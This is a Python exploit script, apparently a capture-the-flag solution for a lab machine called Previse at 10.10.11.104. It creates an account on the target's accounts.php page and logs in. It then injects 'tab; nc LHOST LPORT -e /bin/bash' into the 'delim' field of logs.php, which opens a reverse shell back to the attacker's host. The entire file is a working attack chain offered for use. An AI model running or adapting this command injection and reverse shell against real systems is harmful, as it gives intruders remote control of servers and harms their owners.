import requests
import sys
from requests import session

creds = 'test5'
LHOST = sys.argv[1]
LPORT = sys.argv[2]

def generateAccount():

    payload = {
        'action': 'accounts.php',
        'username': creds,
        'password': creds,
        'confirm': creds
    }

    with requests.Session() as sess:
        sess.post('http://10.10.11.104/accounts.php', data=payload)
        response = sess.get('http://10.10.11.104/accounts.php')
        expectedResponse = 'Success! User was added!'

        #print(response.headers)
        if expectedResponse in response.text:
            print("Account Created..")
        else:
            print("Failed to create an account")

def loginToWebsite():

    loginData = {
        'action': 'login.php',
        'username': creds,
        'password': creds
    }

    with requests.Session() as sess2:
        sess2.post('http://10.10.11.104/login.php', data=loginData)
        response = sess2.get('http://10.10.11.104/index.php')
        expectedResponse = 'Previse File Hosting Service Management.'
        if expectedResponse in response.text:
            print("Successfully Logged in")
        else:
            print("Failed to log in")

def remote_exec():

    loginData = {
        'action': 'login.php',
        'username': creds,
        'password': creds
    }

    payloadData = {'delim': f'tab; nc {LHOST} {LPORT} -e /bin/bash'}

    with requests.Session() as sess2:
        sess2.post('http://10.10.11.104/login.php', data=loginData)
        sess2.post("http://10.10.11.104/logs.php", data=payloadData)
        response = sess2.get('http://10.10.11.104/index.php')
        response = sess2.get("http://10.10.11.104/logs.php")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 ./exploit.py LHOST LPORT")
        exit() 
    generateAccount()
    loginToWebsite()
    remote_exec()
